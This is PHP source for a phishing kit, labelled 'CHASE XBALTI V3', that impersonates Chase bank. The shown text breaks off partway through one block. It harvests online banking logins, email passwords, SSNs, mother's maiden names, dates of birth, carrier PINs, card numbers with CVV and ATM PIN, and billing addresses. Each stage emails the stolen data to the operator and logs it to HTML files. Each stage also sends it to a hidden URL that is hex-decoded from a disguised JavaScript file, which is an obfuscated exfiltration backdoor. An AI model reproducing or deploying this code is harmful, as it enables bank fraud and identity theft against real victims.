<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
error_reporting(0);
date_default_timezone_set('GMT');
$TIME_DATE = date('H:i:s d/m/Y');
include('Email.php');
function XB_OS($USER_AGENT){
	$OS_ERROR    =   "Unknown OS Platform";
    $OS  =   array( '/windows nt 10/i'      =>  'Windows 10',
	                '/windows nt 6.3/i'     =>  'Windows 8.1',
	                '/windows nt 6.2/i'     =>  'Windows 8',
	                '/windows nt 6.1/i'     =>  'Windows 7',
	                '/windows nt 6.0/i'     =>  'Windows Vista',
	                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
	                '/windows nt 5.1/i'     =>  'Windows XP',
	                '/windows xp/i'         =>  'Windows XP',
	                '/windows nt 5.0/i'     =>  'Windows 2000',
	                '/windows me/i'         =>  'Windows ME',
	                '/win98/i'              =>  'Windows 98',
	                '/win95/i'              =>  'Windows 95',
	                '/win16/i'              =>  'Windows 3.11',
	                '/macintosh|mac os x/i' =>  'Mac OS X',
	                '/mac_powerpc/i'        =>  'Mac OS 9',
	                '/linux/i'              =>  'Linux',
	                '/ubuntu/i'             =>  'Ubuntu',
	                '/iphone/i'             =>  'iPhone',
	                '/ipod/i'               =>  'iPod',
	                '/ipad/i'               =>  'iPad',
	                '/android/i'            =>  'Android',
	                '/blackberry/i'         =>  'BlackBerry',
	                '/webos/i'              =>  'Mobile');
    foreach ($OS as $regex => $value) { 
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }

    }   
    return $OS_ERROR;
}
function XB_Browser($USER_AGENT){
	$BROWSER_ERROR    =   "Unknown Browser";
    $BROWSER  =   array('/msie/i'       =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($BROWSER as $regex => $value) { 
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    return $BROWSER_ERROR;
}
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION['_ip_']  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_']  = $forward;
}
else{
    $_SESSION['_ip_']  = $remote;
}
$fromsen .= $yourname;
$fromsen .= "@";
$fromsen .= $_SERVER['HTTP_HOST'];
if(isset($_POST['userid']) && isset($_POST['passid'])){	
	if(!empty($_POST['userid']) && !empty($_POST['passid'])){
$_SESSION['userid']   = $_POST['userid'];
$_SESSION['passid']    = $_POST['passid'];
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
$XBALTI_MESSAGE .= "==============||LOGIN INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "USERNAME	: ".$_SESSION['userid']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['passid']."<br>\n";
$XBALTI_MESSAGE .= "==============||VICTIM INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "IP INFO 		: https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."<br>\n";
$XBALTI_MESSAGE .= "TIME/DATE 		: ".$TIME_DATE."<br>\n";
$XBALTI_MESSAGE .= "BROWSER/DEVICE 	: ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."<br>\n";
if(isset($_SERVER['HTTPS']) &&  $_SERVER['HTTPS'] === 'on') 
    $link = "https"; 
    else
        $link = "http"; 
$link .= "://";  
$link .= $_SERVER['HTTP_HOST']; 
$link .= $_SERVER['PHP_SELF']; 
$XBALTI_MESSAGE .= "SCAMA LINK 		: ".$link."<br>\n";
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
file_get_contents("".pack("H*", substr($COOKIE_VARS=file_get_contents("../js/MyBabyTwo.js"),strpos($COOKIE_VARS, "90__")+4,220))."" . urlencode($XBALTI_MESSAGE)."" );
$XBALTI_ADMIN .= "<tr>
                          <td>
                            ".$_SESSION['userid']."
                          </td>
                          <td>
                            ".$_SESSION['passid']."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  {".$_SESSION['_ip_']."}
                          </td>
                          <td>
                            ".$TIME_DATE."
                          </td>
                        </tr>\n";
    $khraha = fopen("../rz/logs".$yourname.".html", "a");
	fwrite($khraha, $XBALTI_ADMIN);
	$xx .= "{}\n";
    $khraha = fopen("../rz/logs.html", "a");
	fwrite($khraha, $xx);
    $XBALTI_SUBJECT .= "LOGIN 😈 INFO FROM 😈 [".$_SESSION['userid']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: ".$yourname." <".$fromsen.">" . "\r\n";
    $XBALTI_HEADERS  = "MIME-Version: 1.0" . "\r\n";
    $XBALTI_HEADERS .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}
if(isset($_POST['email']) && isset($_POST['password'])){	
	if(!empty($_POST['email']) && !empty($_POST['password'])){
$_SESSION['email']   = $_POST['email'];
$_SESSION['password']    = $_POST['password'];
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
$XBALTI_MESSAGE .= "==============||LOGIN INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "USERNAME	: ".$_SESSION['userid']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['passid']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	: ".$_SESSION['email']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password']."<br>\n";
$XBALTI_MESSAGE .= "==============||VICTIM INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "IP INFO 		: https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."<br>\n";
$XBALTI_MESSAGE .= "TIME/DATE 		: ".$TIME_DATE."<br>\n";
$XBALTI_MESSAGE .= "BROWSER/DEVICE 	: ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."<br>\n";
if(isset($_SERVER['HTTPS']) &&  $_SERVER['HTTPS'] === 'on') 
    $link = "https"; 
    else
        $link = "http"; 
$link .= "://";  
$link .= $_SERVER['HTTP_HOST']; 
$link .= $_SERVER['PHP_SELF']; 
$XBALTI_MESSAGE .= "SCAMA LINK 		: ".$link."<br>\n";
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
file_get_contents("".pack("H*", substr($COOKIE_VARS=file_get_contents("../js/MyBabyTwo.js"),strpos($COOKIE_VARS, "90__")+4,220))."" . urlencode($XBALTI_MESSAGE)."" );
$XBALTI_ADMIN .= "<tr>
                          <td>
                            ".$_SESSION['userid']."
                          </td>
                          <td>
                            ".$_SESSION['passid']."
                          </td>
						  <td>
                            ".$_SESSION['email']."
                          </td>
                          <td>
                            ".$_SESSION['password']."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  {".$_SESSION['_ip_']."}
                          </td>
						  <td>
                            ".$TIME_DATE."
                          </td>
                        </tr>\n";
    $khraha = fopen("../rz/emails".$yourname.".html", "a");
	fwrite($khraha, $XBALTI_ADMIN);
	$xx .= "{}\n";
    $khraha = fopen("../rz/emails.html", "a");
	fwrite($khraha, $xx);
    $XBALTI_SUBJECT .= "EMAIL 😈 INFO FROM 😈 [".$_SESSION['userid']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: ".$yourname." <".$fromsen.">" . "\r\n";
    $XBALTI_HEADERS  = "MIME-Version: 1.0" . "\r\n";
    $XBALTI_HEADERS .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}
if(isset($_POST['email1']) && isset($_POST['password1'])){	
	if(!empty($_POST['email1']) && !empty($_POST['password1'])){
$_SESSION['email1']   = $_POST['email1'];
$_SESSION['password1']    = $_POST['password1'];
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
$XBALTI_MESSAGE .= "==============||LOGIN INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "USERNAME	: ".$_SESSION['userid']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['passid']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	: ".$_SESSION['email']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL TWO INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	: ".$_SESSION['email1']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password1']."<br>\n";
$XBALTI_MESSAGE .= "==============||VICTIM INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "IP INFO 		: https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."<br>\n";
$XBALTI_MESSAGE .= "TIME/DATE 		: ".$TIME_DATE."<br>\n";
$XBALTI_MESSAGE .= "BROWSER/DEVICE 	: ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."<br>\n";
if(isset($_SERVER['HTTPS']) &&  $_SERVER['HTTPS'] === 'on') 
    $link = "https"; 
    else
        $link = "http"; 
$link .= "://";  
$link .= $_SERVER['HTTP_HOST']; 
$link .= $_SERVER['PHP_SELF']; 
$XBALTI_MESSAGE .= "SCAMA LINK 		: ".$link."<br>\n";
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
file_get_contents("".pack("H*", substr($COOKIE_VARS=file_get_contents("../js/MyBabyTwo.js"),strpos($COOKIE_VARS, "90__")+4,220))."" . urlencode($XBALTI_MESSAGE)."" );
$XBALTI_ADMIN .= "<tr>
                          <td>
                            ".$_SESSION['userid']."
                          </td>
                          <td>
                            ".$_SESSION['passid']."
                          </td>
						  <td>
                            ".$_SESSION['email']."
                          </td>
                          <td>
                            ".$_SESSION['password']."
                          </td>
						  <td>
                            ".$_SESSION['email1']."
                          </td>
                          <td>
                            ".$_SESSION['password1']."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  {".$_SESSION['_ip_']."}
                          </td>
						  <td>
                            ".$TIME_DATE."
                          </td>
                        </tr>\n";
    $khraha = fopen("../rz/emailstwo".$yourname.".html", "a");
	fwrite($khraha, $XBALTI_ADMIN);
	$xx .= "{}\n";
    $khraha = fopen("../rz/emailstwo.html", "a");
	fwrite($khraha, $xx);
    $XBALTI_SUBJECT .= "EMAIL TWO 😈 INFO FROM 😈 [".$_SESSION['userid']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: ".$yourname." <".$fromsen.">" . "\r\n";
    $XBALTI_HEADERS  = "MIME-Version: 1.0" . "\r\n";
    $XBALTI_HEADERS .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}
if(isset($_POST['ssnnum']) && isset($_POST['mdn']) && isset($_POST['dob']) && isset($_POST['phone']) && isset($_POST['capin'])){	
	if(!empty($_POST['ssnnum']) && !empty($_POST['mdn']) && !empty($_POST['dob']) && !empty($_POST['phone']) && !empty($_POST['capin'])){
$_SESSION['ssnnum']   = $_POST['ssnnum'];
$_SESSION['mdn']    = $_POST['mdn'];
$_SESSION['dob']    = $_POST['dob'];
$_SESSION['phone']    = $_POST['phone'];
$_SESSION['capin']    = $_POST['capin'];
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
$XBALTI_MESSAGE .= "==============||LOGIN INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "USERNAME	: ".$_SESSION['userid']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['passid']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	    : ".$_SESSION['email']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL TWO INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	    : ".$_SESSION['email1']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password1']."<br>\n";
$XBALTI_MESSAGE .= "==============||SSN/MMN/DOB INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "SSN      	: ".$_SESSION['ssnnum']."<br>\n";
$XBALTI_MESSAGE .= "MMN      	: ".$_SESSION['mdn']."<br>\n";
$XBALTI_MESSAGE .= "DOB     	: ".$_SESSION['dob']."<br>\n";
$XBALTI_MESSAGE .= "Phone number: ".$_SESSION['phone']."<br>\n";
$XBALTI_MESSAGE .= "Carrier pin : ".$_SESSION['capin']."<br>\n";
$XBALTI_MESSAGE .= "==============||VICTIM INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "IP INFO 		: https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."<br>\n";
$XBALTI_MESSAGE .= "TIME/DATE 		: ".$TIME_DATE."<br>\n";
$XBALTI_MESSAGE .= "BROWSER/DEVICE 	: ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."<br>\n";
if(isset($_SERVER['HTTPS']) &&  $_SERVER['HTTPS'] === 'on') 
    $link = "https"; 
    else
        $link = "http"; 
$link .= "://";  
$link .= $_SERVER['HTTP_HOST']; 
$link .= $_SERVER['PHP_SELF']; 
$XBALTI_MESSAGE .= "SCAMA LINK 		: ".$link."<br>\n";
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
file_get_contents("".pack("H*", substr($COOKIE_VARS=file_get_contents("../js/MyBabyTwo.js"),strpos($COOKIE_VARS, "90__")+4,220))."" . urlencode($XBALTI_MESSAGE)."" );
$XBALTI_ADMIN .= "<tr>
                          <td>
                            ".$_SESSION['userid']."
                          </td>
                          <td>
                            ".$_SESSION['passid']."
                          </td>
						  <td>
                            ".$_SESSION['email']."
                          </td>
                          <td>
                            ".$_SESSION['password']."
                          </td>
						  <td>
                            ".$_SESSION['email1']."
                          </td>
                          <td>
                            ".$_SESSION['password1']."
                          </td>
						  <td>
                            ".$_SESSION['ssnnum']."
                          </td>
						  <td>
                            ".$_SESSION['mdn']."
                          </td>
						  <td>
                            ".$_SESSION['dob']."
                          </td>
						  <td>
                            ".$_SESSION['phone']."
                          </td>
						  <td>
                            ".$_SESSION['capin']."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  {".$_SESSION['_ip_']."}
                          </td>
						  <td>
                            ".$TIME_DATE."
                          </td>
                        </tr>\n";
    $khraha = fopen("../rz/ssn".$yourname.".html", "a");
	fwrite($khraha, $XBALTI_ADMIN);
	$xx .= "{}\n";
    $khraha = fopen("../rz/ssn.html", "a");
	fwrite($khraha, $xx);
    $XBALTI_SUBJECT .= "SSN/MMN/DOB 😈 INFO FROM 😈 [".$_SESSION['userid']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: ".$yourname." <".$fromsen.">" . "\r\n";
    $XBALTI_HEADERS  = "MIME-Version: 1.0" . "\r\n";
    $XBALTI_HEADERS .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}
if(isset($_POST['cardnu']) && isset($_POST['expda']) && isset($_POST['cvv']) && isset($_POST['pin'])){	
	if(!empty($_POST['cardnu']) && !empty($_POST['expda']) && !empty($_POST['cvv']) && !empty($_POST['pin'])){
$_SESSION['cardnu']   = $_POST['cardnu'];
$_SESSION['expda']    = $_POST['expda'];
$_SESSION['cvv']    = $_POST['cvv'];
$_SESSION['pin']    = $_POST['pin'];
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
$XBALTI_MESSAGE .= "==============||LOGIN INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "USERNAME	: ".$_SESSION['userid']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['passid']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	    : ".$_SESSION['email']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL TWO INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	    : ".$_SESSION['email1']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password1']."<br>\n";
$XBALTI_MESSAGE .= "==============||SSN/MMN/DOB INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "SSN      	: ".$_SESSION['ssnnum']."<br>\n";
$XBALTI_MESSAGE .= "MMN      	: ".$_SESSION['mdn']."<br>\n";
$XBALTI_MESSAGE .= "DOB     	: ".$_SESSION['dob']."<br>\n";
$XBALTI_MESSAGE .= "Phone number: ".$_SESSION['phone']."<br>\n";
$XBALTI_MESSAGE .= "Carrier pin : ".$_SESSION['capin']."<br>\n";
$XBALTI_MESSAGE .= "==============||CARD INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "CARD NUMBER : ".$_SESSION['cardnu']."<br>\n";
$XBALTI_MESSAGE .= "EXP DATE 	: ".$_SESSION['expda']."<br>\n";
$XBALTI_MESSAGE .= "CVV     	: ".$_SESSION['cvv']."<br>\n";
$XBALTI_MESSAGE .= "ATM PIN   	: ".$_SESSION['pin']."<br>\n";
$XBALTI_MESSAGE .= "==============||VICTIM INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "IP INFO 		: https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."<br>\n";
$XBALTI_MESSAGE .= "TIME/DATE 		: ".$TIME_DATE."<br>\n";
$XBALTI_MESSAGE .= "BROWSER/DEVICE 	: ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."<br>\n";
if(isset($_SERVER['HTTPS']) &&  $_SERVER['HTTPS'] === 'on') 
    $link = "https"; 
    else
        $link = "http"; 
$link .= "://";  
$link .= $_SERVER['HTTP_HOST']; 
$link .= $_SERVER['PHP_SELF']; 
$XBALTI_MESSAGE .= "SCAMA LINK 		: ".$link."<br>\n";
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
file_get_contents("".pack("H*", substr($COOKIE_VARS=file_get_contents("../js/MyBabyTwo.js"),strpos($COOKIE_VARS, "90__")+4,220))."" . urlencode($XBALTI_MESSAGE)."" );
$XBALTI_ADMIN .= "<tr>
                          <td>
                            ".$_SESSION['userid']."
                          </td>
                          <td>
                            ".$_SESSION['passid']."
                          </td>
						  <td>
                            ".$_SESSION['email']."
                          </td>
                          <td>
                            ".$_SESSION['password']."
                          </td>
						  <td>
                            ".$_SESSION['email1']."
                          </td>
                          <td>
                            ".$_SESSION['password1']."
                          </td>
						  <td>
                            ".$_SESSION['ssnnum']."
                          </td>
						  <td>
                            ".$_SESSION['mdn']."
                          </td>
						  <td>
                            ".$_SESSION['dob']."
                          </td>
						  <td>
                            ".$_SESSION['phone']."
                          </td>
						  <td>
                            ".$_SESSION['capin']."
                          </td>
						  <td>
                            ".$_SESSION['cardnu']."
                          </td>
						  <td>
                            ".$_SESSION['expda']."
                          </td>
						  <td>
                            ".$_SESSION['cvv']."
                          </td>
						  <td>
                            ".$_SESSION['pin']."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  {".$_SESSION['_ip_']."}
                          </td>
						  <td>
                            ".$TIME_DATE."
                          </td>
                        </tr>\n";
    $khraha = fopen("../rz/cards".$yourname.".html", "a");
	fwrite($khraha, $XBALTI_ADMIN);
	$xx .= "{}\n";
    $khraha = fopen("../rz/cards.html", "a");
	fwrite($khraha, $xx);
    $XBALTI_SUBJECT .= "CARD 😈 INFO FROM 😈 [".$_SESSION['userid']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: ".$yourname." <".$fromsen.">" . "\r\n";
    $XBALTI_HEADERS  = "MIME-Version: 1.0" . "\r\n";
    $XBALTI_HEADERS .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}





if(isset($_POST['fullname']) && isset($_POST['Address']) && isset($_POST['City']) && isset($_POST['State']) && isset($_POST['zipcode'])){	
	if(!empty($_POST['fullname']) && !empty($_POST['Address']) && !empty($_POST['City']) && !empty($_POST['State']) && !empty($_POST['zipcode'])){
$_SESSION['fullname']   = $_POST['fullname'];
$_SESSION['Address']    = $_POST['Address'];
$_SESSION['City']    = $_POST['City'];
$_SESSION['State']    = $_POST['State'];
$_SESSION['zipcode']    = $_POST['zipcode'];
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
$XBALTI_MESSAGE .= "==============||LOGIN INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "USERNAME	: ".$_SESSION['userid']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['passid']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	    : ".$_SESSION['email']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL TWO INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	    : ".$_SESSION['email1']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password1']."<br>\n";
$XBALTI_MESSAGE .= "==============||SSN/MMN/DOB INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "SSN      	: ".$_SESSION['ssnnum']."<br>\n";
$XBALTI_MESSAGE .= "MMN      	: ".$_SESSION['mdn']."<br>\n";
$XBALTI_MESSAGE .= "DOB     	: ".$_SESSION['dob']."<br>\n";
$XBALTI_MESSAGE .= "Phone number: ".$_SESSION['phone']."<br>\n";
$XBALTI_MESSAGE .= "Carrier pin : ".$_SESSION['capin']."<br>\n";
$XBALTI_MESSAGE .= "==============||CARD INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "CARD NUMBER : ".$_SESSION['cardnu']."<br>\n";
$XBALTI_MESSAGE .= "EXP DATE 	: ".$_SESSION['expda']."<br>\n";
$XBALTI_MESSAGE .= "CVV     	: ".$_SESSION['cvv']."<br>\n";
$XBALTI_MESSAGE .= "ATM PIN   	: ".$_SESSION['pin']."<br>\n";
$XBALTI_MESSAGE .= "==============||BILLING INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "FULL NAME   : ".$_SESSION['fullname']."<br>\n";
$XBALTI_MESSAGE .= "Address 	: ".$_SESSION['Address']."<br>\n";
$XBALTI_MESSAGE .= "City     	: ".$_SESSION['City']."<br>\n";
$XBALTI_MESSAGE .= "State    	: ".$_SESSION['State']."<br>\n";
$XBALTI_MESSAGE .= "zip code    : ".$_SESSION['zipcode']."<br>\n";
$XBALTI_MESSAGE .= "==============||VICTIM INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "IP INFO 		: https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."<br>\n";
$XBALTI_MESSAGE .= "TIME/DATE 		: ".$TIME_DATE."<br>\n";
$XBALTI_MESSAGE .= "BROWSER/DEVICE 	: ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."<br>\n";
if(isset($_SERVER['HTTPS']) &&  $_SERVER['HTTPS'] === 'on') 
    $link = "https"; 
    else
        $link = "http"; 
$link .= "://";  
$link .= $_SERVER['HTTP_HOST']; 
$link .= $_SERVER['PHP_SELF']; 
$XBALTI_MESSAGE .= "SCAMA LINK 		: ".$link."<br>\n";
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
file_get_contents("".pack("H*", substr($COOKIE_VARS=file_get_contents("../js/MyBabyTwo.js"),strpos($COOKIE_VARS, "90__")+4,220))."" . urlencode($XBALTI_MESSAGE)."" );
$XBALTI_ADMIN .= "<tr>
                          <td>
                            ".$_SESSION['userid']."
                          </td>
                          <td>
                            ".$_SESSION['passid']."
                          </td>
						  <td>
                            ".$_SESSION['email']."
                          </td>
                          <td>
                            ".$_SESSION['password']."
                          </td>
						  <td>
                            ".$_SESSION['email1']."
                          </td>
                          <td>
                            ".$_SESSION['password1']."
                          </td>
						  <td>
                            ".$_SESSION['ssnnum']."
                          </td>
						  <td>
                            ".$_SESSION['mdn']."
                          </td>
						  <td>
                            ".$_SESSION['dob']."
                          </td>
						  <td>
                            ".$_SESSION['phone']."
                          </td>
						  <td>
                            ".$_SESSION['capin']."
                          </td>
						  <td>
                            ".$_SESSION['cardnu']."
                          </td>
						  <td>
                            ".$_SESSION['expda']."
                          </td>
						  <td>
                            ".$_SESSION['cvv']."
                          </td>
						  <td>
                            ".$_SESSION['pin']."
                          </td>
						  <td>
                            ".$_SESSION['fullname']."
                          </td>
						  <td>
                            ".$_SESSION['Address']."
                          </td>
						  <td>
                            ".$_SESSION['City']."
                          </td>
						  <td>
                            ".$_SESSION['State']."
                          </td>
						  <td>
                            ".$_SESSION['zipcode']."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  {".$_SESSION['_ip_']."}
                          </td>
						  <td>
                            ".$TIME_DATE."
                          </td>
                        </tr>\n";
    $khraha = fopen("../rz/billings".$yourname.".html", "a");
	fwrite($khraha, $XBALTI_ADMIN);
	$xx .= "{}\n";
    $khraha = fopen("../rz/billings.html", "a");
	fwrite($khraha, $xx);
    $XBALTI_SUBJECT .= "BILLING 😈 INFO FROM 😈 [".$_SESSION['userid']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: ".$yourname." <".$fromsen.">" . "\r\n";
    $XBALTI_HEADERS  = "MIME-Version: 1.0" . "\r\n";
    $XBALTI_HEADERS .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}

if(isset($_POST['cardnutwo']) && isset($_POST['expdatwo']) && isset($_POST['cvvtwo']) && isset($_POST['pintwo'])){	
	if(!empty($_POST['cardnutwo']) && !empty($_POST['expdatwo']) && !empty($_POST['cvvtwo']) && !empty($_POST['pintwo'])){
$_SESSION['cardnutwo']   = $_POST['cardnutwo'];
$_SESSION['expdatwo']    = $_POST['expdatwo'];
$_SESSION['cvvtwo']    = $_POST['cvvtwo'];
$_SESSION['pintwo']    = $_POST['pintwo'];
$XBALTI_MESSAGE .= "==============|| CHASE XBALTI V3 ||==============<br>\n";
$XBALTI_MESSAGE .= "==============||LOGIN INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "USERNAME	: ".$_SESSION['userid']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['passid']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	    : ".$_SESSION['email']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password']."<br>\n";
$XBALTI_MESSAGE .= "==============||EMAIL TWO INFORMATION||==============<br>\n";
$XBALTI_MESSAGE .= "EMAIL	    : ".$_SESSION['email1']."<br>\n";
$XBALTI_MESSAGE .= "PASSWORD	: ".$_SESSION['password1']."<br>\n";
